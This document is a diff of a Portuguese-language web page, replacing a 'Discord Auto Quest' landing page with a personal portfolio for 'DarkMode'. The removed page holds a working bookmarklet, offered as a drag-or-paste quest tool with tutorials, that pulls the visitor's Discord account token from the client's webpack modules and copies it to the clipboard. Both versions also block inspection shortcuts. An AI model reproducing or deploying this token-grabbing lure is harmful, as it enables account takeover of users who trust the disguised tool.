@@ -2,549 +2,597 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Discord Auto Quest - Bot de Missões Automáticas</title>
-
-<meta name="description" content="Discord Auto Quest é um sistema automático de quests/missões para Discord. Automatize as missões, recompensas e progressão dos membros.">
-<meta name="keywords" content="discord bot quests, discord quest bot, discord missions, auto quest discord, discord automation bot, discord rewards system">
-<meta name="author" content="DarkMode">
-
-<meta property="og:type" content="website">
-<meta property="og:title" content="Discord Auto Quest - Sistema de Missões Automáticas">
-<meta property="og:description" content="Sistema automático de quests para Discord. Missões, recompensas e progressão de usuários totalmente automatizada.">
-<meta property="og:image" content="https://i.imgur.com/l0CPot7.gif">
-<meta property="og:url" content="https://autoquest.darkmod3.workers.dev/">
-
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Discord Auto Quest">
-<meta name="twitter:description" content="Bot de quests automáticas para Discord.">
-<meta name="twitter:image" content="https://i.imgur.com/l0CPot7.gif">
-<link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
-<script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "0b9436f05cc8413ea42ef73c47da7b9c"}'></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DarkMode — Portfolio</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css">
 <style>
-*{
-  box-sizing:border-box;
-  margin:0;
-  padding:0;
-  user-select:none;
-  -webkit-user-select:none;
-  -moz-user-select:none;
-  -ms-user-select:none
-}
-
-html,body{
-  height:100%;
-  background:#080808
-}
-
-body{
-  font-family:'Geist Mono',monospace;
-  color:#e8e8e8;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  min-height:100vh;
-  padding:32px 20px;
-  gap:14px
-}
-
-h1{
-  font-size:13px;
-  font-weight:400;
-  letter-spacing:.25em;
-  text-transform:uppercase;
-  color:rgba(255,255,255,0.6);
-  text-align:center;
-  line-height:1.5
-}
-
-h1 b{
-  color:#60a5fa;
-  font-weight:600
-}
-
-.btns{
-  display:flex;
-  gap:8px;
-  margin-top:4px;
-  align-items:center;
-  justify-content:center;
-  flex-wrap:wrap
-}
-
-.btn{
-  padding:11px 24px;
-  border-radius:5px;
-  font-family:'Geist Mono',monospace;
-  font-size:10.5px;
-  font-weight:500;
-  letter-spacing:.1em;
-  text-transform:uppercase;
-  cursor:pointer;
-  transition:all .2s;
-  text-decoration:none;
-  display:inline-flex;
-  align-items:center;
-  justify-content:center;
-  border:none;
-  outline:none;
-  white-space:nowrap;
-  min-width:160px
-}
-
-.btn-drag{
-  border:1px solid rgba(255,255,255,0.2);
-  color:rgba(255,255,255,0.65);
-  background:none
-}
-
-.btn-drag:hover{
-  border-color:rgba(59,130,246,0.45);
-  color:#60a5fa
-}
-
-.btn-copy{
-  border:1px solid rgba(255,255,255,0.2);
-  color:rgba(255,255,255,0.65);
-  background:none
-}
-
-.btn-copy:hover{
-  border-color:rgba(59,130,246,0.45);
-  color:#60a5fa
-}
-
-.btn-tutorial{
-  border:1px solid rgba(59,130,246,0.6);
-  color:#60a5fa;
-  background:rgba(59,130,246,0.08);
-  margin-top:8px;
-  width:auto;
-  min-width:160px
-}
-
-.btn-tutorial:hover{
-  background:rgba(59,130,246,0.15);
-  box-shadow:0 0 22px rgba(59,130,246,0.2);
-  color:#93c5fd
-}
-
-.btn-discord{
-  border:1px solid rgba(88,101,242,0.7);
-  color:#a5b4fc;
-  background:rgba(88,101,242,0.1);
-  margin-top:8px;
-  min-width:160px;
-  display:inline-flex;
-  align-items:center;
-  gap:6px;
-}
-
-.btn-discord:hover{
-  background:rgba(88,101,242,0.2);
-  box-shadow:0 0 22px rgba(88,101,242,0.25);
-  color:#c7d2fe;
-}
-
-.divider{
-  width:1px;
-  height:28px;
-  background:rgba(255,255,255,0.1)
-}
-
-.modal{
-  display:none;
-  position:fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background:rgba(0,0,0,0.9);
-  z-index:1000;
-  align-items:center;
-  justify-content:center;
-  padding:20px;
-  backdrop-filter:blur(10px);
-  overflow-y:auto
-}
-
-.modal.active{
-  display:flex
-}
-
-.modal-content{
-  background:#0f0f0f;
-  border:1px solid rgba(59,130,246,0.3);
-  border-radius:8px;
-  padding:32px;
-  max-width:900px;
-  width:100%;
-  max-height:90vh;
-  overflow-y:auto;
-  position:relative;
-  margin:auto
-}
-
-.modal-close{
-  position:absolute;
-  top:16px;
-  right:16px;
-  background:none;
-  border:none;
-  color:rgba(255,255,255,0.5);
-  font-size:24px;
-  cursor:pointer;
-  width:32px;
-  height:32px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  transition:all .2s;
-  border-radius:4px;
-  z-index:1
-}
-
-.modal-close:hover{
-  color:#60a5fa;
-  background:rgba(59,130,246,0.1)
-}
-
-.modal-title{
-  font-size:16px;
-  font-weight:500;
-  letter-spacing:.15em;
-  text-transform:uppercase;
-  color:#60a5fa;
-  margin-bottom:24px;
-  text-align:center
-}
-
-.video-section{
-  margin-bottom:28px
-}
-
-.video-section:last-child{
-  margin-bottom:0
-}
-
-.video-label{
-  font-size:11px;
-  font-weight:500;
-  letter-spacing:.1em;
-  text-transform:uppercase;
-  color:rgba(255,255,255,0.7);
-  margin-bottom:12px;
-  text-align:center
-}
-
-.video-wrapper{
-  position:relative;
-  width:100%;
-  padding-bottom:56.25%;
-  background:#000;
-  border-radius:6px;
-  overflow:hidden;
-  border:1px solid rgba(59,130,246,0.2)
-}
-
-.video-wrapper video,
-.video-wrapper iframe{
-  position:absolute;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  border:none
-}
-
-.foot{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:6px;
-  font-size:11px;
-  color:rgba(255,255,255,0.35);
-  margin-top:6px;
-  text-align:center;
-  flex-wrap:wrap
-}
-
-.foot b{
-  color:#60a5fa;
-  font-weight:400
-}
-
-textarea{
-  position:absolute;
-  left:-9999px
-}
-
-@media (max-width:768px){
-
-  body{
-    padding:24px 16px;
-    gap:12px
+  *, *::before, *::after {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Fira Code', monospace;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    user-select: none;
+    -webkit-user-drag: none;
   }
 
-  h1{
-    font-size:11px;
-    letter-spacing:.2em
+  ::-webkit-scrollbar { display: none; }
+
+  html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    background: #000;
   }
 
-  .btns{
-    gap:6px;
-    width:100%
+  #splash {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    cursor: pointer;
+    transition: opacity 0.8s ease, visibility 0.8s ease;
   }
 
-  .btns .btn{
-    flex:1;
-    min-width:0
+  #splash.hidden {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
   }
 
-  .btn{
-    padding:10px 18px;
-    font-size:9.5px
+  .splash-text {
+    color: #fff;
+    font-size: clamp(0.85rem, 2vw, 1.1rem);
+    font-weight: 400;
+    letter-spacing: 0.25em;
+    text-transform: lowercase;
+    opacity: 0;
+    animation: fadeInText 1.4s ease forwards 0.5s;
   }
 
-  .divider{
-    display:none
+  .splash-text span {
+    color: #7c6aff;
   }
 
-  .modal-content{
-    padding:24px 16px;
-    margin:10px
+  @keyframes fadeInText {
+    0% { opacity: 0; transform: translateY(8px); }
+    100% { opacity: 1; transform: translateY(0); }
   }
 
-  .modal-title{
-    font-size:14px;
-    margin-bottom:20px
+  #site {
+    position: fixed;
+    inset: 0;
+    overflow-y: auto;
+    overflow-x: hidden;
+    opacity: 0;
+    transition: opacity 0.9s ease;
   }
 
-  .video-label{
-    font-size:10px
+  #site::-webkit-scrollbar { display: none; }
+
+  #site.visible { opacity: 1; }
+
+  .bg-layer {
+    position: fixed;
+    inset: 0;
+    background: url('https://i.pinimg.com/originals/6b/4a/f9/6b4af9a7e6dd84cb06a93218b2578c6e.gif') center/cover no-repeat;
+    z-index: 0;
   }
 
-  .video-section{
-    margin-bottom:20px
+  .bg-blur {
+    position: fixed;
+    inset: 0;
+    backdrop-filter: blur(12px) brightness(0.35);
+    -webkit-backdrop-filter: blur(12px) brightness(0.35);
+    z-index: 1;
   }
 
-  .foot{
-    font-size:8px;
-    gap:4px
+  .page-content {
+    position: relative;
+    z-index: 2;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 16px;
+    gap: 20px;
   }
 
-}
-
-@media (max-width:480px){
-
-  h1{
-    font-size:10px;
-    letter-spacing:.15em
+  .card {
+    background: rgba(10, 10, 15, 0.72);
+    border: 1px solid rgba(255, 255, 255, 0.07);
+    border-radius: 20px;
+    backdrop-filter: blur(24px) saturate(1.4);
+    -webkit-backdrop-filter: blur(24px) saturate(1.4);
+    width: 100%;
+    max-width: 420px;
+    padding: 36px 32px 32px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0;
   }
 
-  .btns{
-    flex-direction:column;
-    width:100%;
-    max-width:280px
+  .avatar-wrap {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    border: 2px solid rgba(124, 106, 255, 0.5);
+    overflow: hidden;
+    flex-shrink: 0;
   }
 
-  .btn{
-    width:100%;
-    padding:9px 14px;
-    font-size:9px
+  .avatar-wrap img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+    pointer-events: none;
   }
 
-  .btn-tutorial{
-    width:100%;
-    max-width:280px
+  .nick {
+    margin-top: 14px;
+    color: #fff;
+    font-size: 1.15rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-align: center;
   }
 
-}
+  .desc {
+    margin-top: 7px;
+    color: rgba(200, 200, 220, 0.65);
+    font-size: 0.78rem;
+    font-weight: 300;
+    line-height: 1.6;
+    text-align: center;
+    letter-spacing: 0.02em;
+  }
+
+  .divider {
+    width: 100%;
+    height: 1px;
+    background: rgba(255, 255, 255, 0.08);
+    margin: 24px 0;
+  }
+
+  .social-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+
+  .social-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 42px;
+    height: 42px;
+    border-radius: 10px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    color: rgba(210, 210, 230, 0.75);
+    font-size: 1.1rem;
+    text-decoration: none;
+    transition: background 0.2s ease, color 0.2s ease, border-color 0.2s ease, transform 0.18s ease;
+  }
+
+  .social-btn:hover {
+    background: rgba(124, 106, 255, 0.18);
+    border-color: rgba(124, 106, 255, 0.4);
+    color: #fff;
+    transform: translateY(-2px);
+  }
+
+  .discord-card {
+    background: rgba(10, 10, 15, 0.72);
+    border: 1px solid rgba(255, 255, 255, 0.07);
+    border-radius: 20px;
+    backdrop-filter: blur(24px) saturate(1.4);
+    -webkit-backdrop-filter: blur(24px) saturate(1.4);
+    width: 100%;
+    max-width: 420px;
+    overflow: hidden;
+  }
+
+  .dc-banner {
+    width: 100%;
+    height: 110px;
+    object-fit: cover;
+    display: block;
+    pointer-events: none;
+    background: #1a1a2e;
+  }
+
+  .dc-body {
+    padding: 0 24px 26px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: 0;
+  }
+
+  .dc-icon-wrap {
+    margin-top: -32px;
+    width: 64px;
+    height: 64px;
+    border-radius: 14px;
+    border: 3px solid rgba(10, 10, 15, 0.9);
+    overflow: hidden;
+    flex-shrink: 0;
+  }
+
+  .dc-icon-wrap img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+    pointer-events: none;
+  }
+
+  .dc-name {
+    margin-top: 12px;
+    color: #fff;
+    font-size: 1rem;
+    font-weight: 600;
+    letter-spacing: 0.03em;
+  }
+
+  .dc-desc {
+    margin-top: 6px;
+    color: rgba(190, 190, 210, 0.6);
+    font-size: 0.73rem;
+    font-weight: 300;
+    line-height: 1.6;
+    letter-spacing: 0.01em;
+  }
+
+  .dc-stats {
+    margin-top: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 18px;
+  }
+
+  .dc-stat {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 2px;
+  }
+
+  .dc-stat-val {
+    color: #fff;
+    font-size: 0.88rem;
+    font-weight: 600;
+  }
+
+  .dc-stat-label {
+    color: rgba(180, 180, 200, 0.5);
+    font-size: 0.65rem;
+    font-weight: 300;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+
+  .dc-stat-dot {
+    display: inline-block;
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #3ba55d;
+    margin-right: 4px;
+    vertical-align: middle;
+  }
+
+  .dc-join-btn {
+    margin-top: 20px;
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    padding: 10px 28px;
+    background: #5865f2;
+    color: #fff;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    border-radius: 10px;
+    text-decoration: none;
+    border: none;
+    cursor: pointer;
+    transition: background 0.2s ease, transform 0.18s ease;
+  }
+
+  .dc-join-btn:hover {
+    background: #4752c4;
+    transform: translateY(-2px);
+  }
+
+  #music-player {
+    position: fixed;
+    top: 16px;
+    left: 16px;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    background: rgba(10, 10, 15, 0.78);
+    border: 1px solid rgba(255, 255, 255, 0.07);
+    border-radius: 12px;
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    padding: 8px 13px 8px 10px;
+    opacity: 0;
+    transition: opacity 0.6s ease;
+  }
+
+  #music-player.visible { opacity: 1; }
+
+  .mp-btn {
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: rgba(210, 210, 230, 0.8);
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: color 0.2s ease;
+    padding: 0;
+  }
+
+  .mp-btn:hover { color: #fff; }
+
+  .mp-info {
+    display: flex;
+    flex-direction: column;
+    gap: 1px;
+    max-width: 130px;
+  }
+
+  .mp-title {
+    color: rgba(230, 230, 250, 0.9);
+    font-size: 0.65rem;
+    font-weight: 500;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    letter-spacing: 0.02em;
+  }
+
+  .mp-bars {
+    display: flex;
+    align-items: flex-end;
+    gap: 2px;
+    height: 10px;
+  }
+
+  .mp-bar {
+    width: 2px;
+    background: #7c6aff;
+    border-radius: 1px;
+    height: 3px;
+    transition: height 0.1s ease;
+  }
+
+  .mp-bars.playing .mp-bar:nth-child(1) { animation: bar1 0.8s ease-in-out infinite; }
+  .mp-bars.playing .mp-bar:nth-child(2) { animation: bar2 0.9s ease-in-out infinite 0.15s; }
+  .mp-bars.playing .mp-bar:nth-child(3) { animation: bar3 0.7s ease-in-out infinite 0.05s; }
+  .mp-bars.playing .mp-bar:nth-child(4) { animation: bar1 0.85s ease-in-out infinite 0.2s; }
+
+  @keyframes bar1 { 0%,100%{height:3px} 50%{height:10px} }
+  @keyframes bar2 { 0%,100%{height:6px} 50%{height:3px} }
+  @keyframes bar3 { 0%,100%{height:9px} 50%{height:4px} }
+
+  .skeleton {
+    background: rgba(255,255,255,0.06);
+    border-radius: 6px;
+    animation: skPulse 1.5s ease-in-out infinite;
+  }
+
+  @keyframes skPulse { 0%,100%{opacity:0.6} 50%{opacity:1} }
+
+  .sk-text { height: 12px; width: 80%; margin: 4px auto; }
+  .sk-text-sm { height: 10px; width: 60%; margin: 3px auto; }
+
+  @media (max-width: 480px) {
+    .card, .discord-card { max-width: 100%; border-radius: 16px; }
+    .card { padding: 28px 20px 24px; }
+  }
 </style>
 </head>
 <body>
 
-<h1>discord <b>auto quest</b></h1>
-
-<div class="btns">
-  <a class="btn btn-drag" id="dragBtn" href="javascript:(function(){var t='';window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let o of Object.values(e.c))try{if(!o.exports||o.exports===window)continue;o.exports?.getToken&&(t=o.exports.getToken());for(let e in o.exports)o.exports?.[e]?.getToken&&'IntlMessagesProxy'!==o.exports[e][Symbol.toStringTag]&&(t=o.exports[e].getToken())}catch{}}]);window.webpackChunkdiscord_app.pop();t&&t!=='undefined'&&(navigator.clipboard.writeText(t).then(()=>alert('✓')).catch(e=>{(e=document.createElement('textarea')).value=t,document.body.appendChild(e),e.select(),document.execCommand('copy'),document.body.removeChild(e),alert('✓')}))})();">Arrastar (PC)</a>
-  <div class="divider"></div>
-  <button class="btn btn-copy" id="copybtn" onclick="copyCode()">Copiar (Celular)</button>
+<div id="splash">
+  <p class="splash-text">clique para <span>entrar</span></p>
 </div>
 
-<div class="btns">
-  <button class="btn btn-tutorial" onclick="openModal()">Tutoriais</button>
-  <a class="btn btn-discord" href="https://discord.gg/HgYRUTE9aF" target="_blank">Discord</a>
-</div>
+<div id="site">
+  <div class="bg-layer"></div>
+  <div class="bg-blur"></div>
 
-<div class="foot">
-  <svg width="10" height="10" viewBox="0 0 24 24" fill="#60a5fa" opacity=".7"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.032.054a19.9 19.9 0 0 0 5.993 3.03.077.077 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.074.074 0 0 0-.041-.104 13.12 13.12 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
-  made by <b>nejizzuki</b> & <b>&lt;\DarkMode&gt;</b>
-</div>
-
-<div class="modal" id="tutorialModal" onclick="closeModalOnBackdrop(event)">
-  <div class="modal-content" onclick="event.stopPropagation()">
-    <button class="modal-close" onclick="closeModal()">&times;</button>
-    <h2 class="modal-title">Tutoriais</h2>
-    
-    <div class="video-section">
-      <div class="video-label">Tutorial de Celular</div>
-      <div class="video-wrapper" id="video-celular">
-      </div>
-    </div>
-    
-    <div class="video-section">
-      <div class="video-label">Tutorial de PC</div>
-      <div class="video-wrapper" id="video-pc">
+  <div id="music-player">
+    <button class="mp-btn" id="mp-toggle"><i class="bi bi-pause-fill" id="mp-icon"></i></button>
+    <div class="mp-info">
+      <span class="mp-title" id="mp-title">Carregando...</span>
+      <div class="mp-bars playing" id="mp-bars">
+        <div class="mp-bar"></div>
+        <div class="mp-bar"></div>
+        <div class="mp-bar"></div>
+        <div class="mp-bar"></div>
       </div>
     </div>
   </div>
+
+  <audio id="audio" loop>
+    <source src="https://ia800905.us.archive.org/19/items/FREE_background_music_dhalius/backsound.mp3" type="audio/mpeg">
+  </audio>
+
+  <div class="page-content">
+
+    <div class="card" data-aos="fade-up" data-aos-duration="700">
+      <div class="avatar-wrap">
+        <img id="user-avatar" src="" alt="Avatar">
+      </div>
+      <p class="nick" id="user-nick"><span class="skeleton sk-text" style="display:inline-block;width:100px;height:16px;"></span></p>
+      <p class="desc">desenvolvedor • entusiasta de segurança • criador de conteúdo</p>
+
+      <div class="divider"></div>
+
+      <div class="social-row">
+        <a class="social-btn" href="https://discord.com/users/1080175803024814142" target="_blank" rel="noopener" title="Discord"><i class="bi bi-discord"></i></a>
+        <a class="social-btn" href="https://github.com/" target="_blank" rel="noopener" title="GitHub"><i class="bi bi-github"></i></a>
+        <a class="social-btn" href="https://store.steampowered.com/" target="_blank" rel="noopener" title="Steam"><i class="bi bi-steam"></i></a>
+        <a class="social-btn" href="https://twitter.com/" target="_blank" rel="noopener" title="Twitter / X"><i class="bi bi-twitter-x"></i></a>
+        <a class="social-btn" href="https://youtube.com/" target="_blank" rel="noopener" title="YouTube"><i class="bi bi-youtube"></i></a>
+        <a class="social-btn" href="mailto:dark@email.com" title="Email"><i class="bi bi-envelope"></i></a>
+      </div>
+
+      <div class="divider"></div>
+
+      <div class="discord-card" id="dc-card" style="width:100%;max-width:100%;border:none;border-radius:14px;">
+        <div style="width:100%;height:110px;background:rgba(255,255,255,0.04);border-radius:14px 14px 0 0;" id="dc-banner-wrap">
+          <img id="dc-banner" class="dc-banner" style="border-radius:14px 14px 0 0;" src="" alt="" onerror="this.style.display='none'">
+        </div>
+        <div class="dc-body">
+          <div class="dc-icon-wrap">
+            <img id="dc-icon" src="" alt="Server Icon">
+          </div>
+          <p class="dc-name" id="dc-name"><span class="skeleton sk-text" style="display:inline-block;width:120px;height:14px;"></span></p>
+          <p class="dc-desc" id="dc-desc"><span class="skeleton sk-text-sm" style="display:inline-block;width:90%;height:10px;"></span></p>
+          <div class="dc-stats">
+            <div class="dc-stat">
+              <span class="dc-stat-val" id="dc-members">—</span>
+              <span class="dc-stat-label">membros</span>
+            </div>
+            <div class="dc-stat">
+              <span class="dc-stat-val" id="dc-online"><span class="dc-stat-dot"></span><span id="dc-online-val">—</span></span>
+              <span class="dc-stat-label">online</span>
+            </div>
+          </div>
+          <a class="dc-join-btn" id="dc-join" href="https://discord.gg/platformdestroyer" target="_blank" rel="noopener">
+            <i class="bi bi-discord"></i> Entrar no Servidor
+          </a>
+        </div>
+      </div>
+    </div>
+
+  </div>
 </div>
 
-<textarea id="jscode">javascript:(function(){var t='';window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let o of Object.values(e.c))try{if(!o.exports||o.exports===window)continue;o.exports?.getToken&&(t=o.exports.getToken());for(let e in o.exports)o.exports?.[e]?.getToken&&'IntlMessagesProxy'!==o.exports[e][Symbol.toStringTag]&&(t=o.exports[e].getToken())}catch{}}]);window.webpackChunkdiscord_app.pop();t&&t!=='undefined'&&(navigator.clipboard.writeText(t).then(()=>alert('✓')).catch(e=>{(e=document.createElement('textarea')).value=t,document.body.appendChild(e),e.select(),document.execCommand('copy'),document.body.removeChild(e),alert('✓')}))})();</textarea>
-
+<script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js"></script>
 <script>
-document.addEventListener('contextmenu', function(e) {
-  e.preventDefault();
-  return false;
-});
+  AOS.init({ once: true, offset: 20 });
 
-document.addEventListener('dragstart', function(e) {
-  if (e.target.id !== 'dragBtn') {
-    e.preventDefault();
-    return false;
-  }
-});
-
-document.getElementById('dragBtn').addEventListener('click', function(e) {
-  e.preventDefault();
-  copyCodeDrag();
-});
-
-function openModal() {
-  document.getElementById('tutorialModal').classList.add('active');
-  document.body.style.overflow = 'hidden';
-}
-
-function closeModal() {
-  document.getElementById('tutorialModal').classList.remove('active');
-  document.body.style.overflow = '';
-}
-
-function closeModalOnBackdrop(e) {
-  if (e.target.id === 'tutorialModal') {
-    closeModal();
-  }
-}
-
-document.addEventListener('keydown', function(e) {
-  if (e.key === 'Escape') {
-    closeModal();
-  }
-});
-
-function copyCode() {
-  var textArea = document.getElementById("jscode");
-
-  textArea.style.position = "fixed";
-  textArea.style.left = "0";
-  textArea.style.top = "0";
-  textArea.style.opacity = "0";
-
-  textArea.select();
-  textArea.setSelectionRange(0, 99999);
-
-  try {
-    document.execCommand("copy");
-    feedbackCopy();
-  } catch (err) {
-
-    navigator.clipboard.writeText(textArea.value).then(function(){
-      feedbackCopy();
-    }).catch(function(){
-      alert("Erro ao copiar. Copie manualmente.");
-    });
-
-  }
-
-  textArea.style.left = "-9999px";
-}
-
-function feedbackCopy(){
-  var b = document.getElementById("copybtn");
-  var originalText = b.innerHTML;
-
-  b.innerHTML = "copiado!";
-
-  setTimeout(function(){
-    b.innerHTML = originalText;
-  },2000);
-}
-
-function copyCodeDrag() {
-  var textArea = document.getElementById('jscode');
-  navigator.clipboard.writeText(textArea.value).then(function(){
-    var b = document.getElementById('dragBtn');
-    var originalText = b.innerHTML;
-    b.innerHTML = 'copiado!';
-    setTimeout(function(){
-      b.innerHTML = originalText;
-    }, 2000);
-  }).catch(function(err) {
-    console.error('Erro ao copiar:', err);
-    alert('Erro ao copiar. Por favor, tente novamente.');
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('dragstart', e => e.preventDefault());
+  document.addEventListener('keydown', e => {
+    const blocked = (
+      e.key === 'F12' ||
+      (e.ctrlKey && ['u','U','s','S','a','A','c','C','p','P','i','I','j','J'].includes(e.key)) ||
+      (e.ctrlKey && e.shiftKey && ['i','I','j','J','c','C','k','K'].includes(e.key))
+    );
+    if (blocked) e.preventDefault();
   });
-}
 
-window.addEventListener('DOMContentLoaded', function () {
+  const splash = document.getElementById('splash');
+  const site = document.getElementById('site');
+  const audio = document.getElementById('audio');
+  const mpToggle = document.getElementById('mp-toggle');
+  const mpIcon = document.getElementById('mp-icon');
+  const mpBars = document.getElementById('mp-bars');
+  const mpPlayer = document.getElementById('music-player');
 
-  var videoCelular = 'https://cdn.discordapp.com/attachments/1080183819572887613/1479459365533647041/Celular.mp4?ex=69ac1d67&is=69aacbe7&hm=83125f55225d1bac1159e207a3c43d9e6569a9c87756066c192dce269cedbafe&';
-  var videoPC = 'https://cdn.discordapp.com/attachments/1080183819572887613/1479445586947211367/PC.mp4?ex=69ac1092&is=69aabf12&hm=edd0200fc235e0386f0ee914bd6b0bc84ffd713dab70ef74a454e8740477b138&';
+  splash.addEventListener('click', () => {
+    splash.classList.add('hidden');
+    site.classList.add('visible');
+    audio.volume = 0.35;
+    audio.play().catch(() => {});
+    setTimeout(() => mpPlayer.classList.add('visible'), 900);
+    loadData();
+  });
 
+  mpToggle.addEventListener('click', () => {
+    if (audio.paused) {
+      audio.play();
+      mpIcon.className = 'bi bi-pause-fill';
+      mpBars.classList.add('playing');
+    } else {
+      audio.pause();
+      mpIcon.className = 'bi bi-play-fill';
+      mpBars.classList.remove('playing');
+    }
+  });
 
-  function loadVideo(url, containerId) {
+  document.getElementById('mp-title').textContent = 'Lo-fi Chill';
 
-    if (!url) return;
-
-    var container = document.getElementById(containerId);
-    if (!container) return;
-
-    container.innerHTML = '';
-
-    var video = document.createElement('video');
-
-    video.controls = true;
-    video.preload = 'metadata';
-    video.playsInline = true;
-
-    video.style.width = '100%';
-    video.style.height = '100%';
-    video.style.borderRadius = '8px';
-
-    var source = document.createElement('source');
-    source.src = url;
-    source.type = 'video/mp4';
-
-    video.appendChild(source);
-
-    container.appendChild(video);
-
+  function formatCount(n) {
+    if (n >= 1000000) return (n / 1000000).toFixed(1).replace('.0', '') + 'M';
+    if (n >= 1000) return (n / 1000).toFixed(1).replace('.0', '') + 'K';
+    return n.toLocaleString('pt-BR');
   }
 
+  async function loadData() {
+    try {
+      const [userRes, guildRes] = await Promise.all([
+        fetch('https://darkscrapper.squareweb.app/discord/user/1080175803024814142'),
+        fetch('https://discord.com/api/v9/invites/platformdestroyer?with_counts=true')
+      ]);
+      const user = await userRes.json();
+      const guild = await guildRes.json();
 
-  if (videoCelular) {
-    loadVideo(videoCelular, 'video-celular');
+      const avatarEl = document.getElementById('user-avatar');
+      avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=256`;
+
+      const nickEl = document.getElementById('user-nick');
+      nickEl.innerHTML = '';
+      nickEl.textContent = user.global_name || user.username;
+
+      const guildData = guild.guild || {};
+      const profile = guild.profile || {};
+
+      const iconHash = guildData.icon || profile.icon_hash;
+      const guildId = guildData.id || guild.guild_id;
+      const bannerHash = guildData.banner;
+
+      if (iconHash && guildId) {
+        document.getElementById('dc-icon').src = `https://cdn.discordapp.com/icons/${guildId}/${iconHash}.webp?size=128`;
+      }
+
+      if (bannerHash && guildId) {
+        const bannerEl = document.getElementById('dc-banner');
+        bannerEl.src = `https://cdn.discordapp.com/banners/${guildId}/${bannerHash}.webp?size=600`;
+        bannerEl.style.display = 'block';
+      }
+
+      const nameEl = document.getElementById('dc-name');
+      nameEl.innerHTML = '';
+      nameEl.textContent = guildData.name || profile.name || 'Platform Destroyer';
+
+      const descEl = document.getElementById('dc-desc');
+      descEl.innerHTML = '';
+      descEl.textContent = guildData.description || profile.description || '';
+
+      document.getElementById('dc-members').textContent = formatCount(guild.approximate_member_count || profile.member_count || 0);
+      document.getElementById('dc-online-val').textContent = formatCount(guild.approximate_presence_count || profile.online_count || 0);
+    } catch (err) {
+      console.warn('Failed to load data', err);
+    }
   }
-
-  if (videoPC) {
-    loadVideo(videoPC, 'video-pc');
-  }
-
-});
 </script>
-
 </body>
-
 </html>
-
